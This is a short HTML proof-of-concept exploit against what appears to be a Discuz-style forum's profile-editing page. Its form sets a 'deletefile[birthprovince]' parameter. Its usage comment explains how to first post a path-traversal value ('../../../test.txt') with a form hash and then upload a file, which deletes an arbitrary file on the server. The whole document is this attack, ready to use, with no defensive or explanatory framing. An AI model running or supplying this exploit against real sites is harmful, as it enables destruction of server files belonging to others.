<form action="http://127.0.0.1/upload/home.php?mod=spacecp&ac=profile&op=base&deletefile[birthprovince]=aaaaaa"method="POST" enctype="multipart/form-data">
<input type="file"name="birthprovince" id="file" />
<input type="text"name="formhash" value="de746a38"/></p>
<input type="text"name="profilesubmit" value="1"/></p>
<input type="submit"value="Submit" />
</from>

<!-- 
	Usages: 
		step1 : GET http://127.0.0.1/upload/home.php?mod=spacecp&ac=profile&op=base and POST birthprovince=../../../test.txt[the file you delete]&profilesubmit=1&formhash=2fce4b73[your hash]
		step2 : upload jpg from form.php then file delete 
-->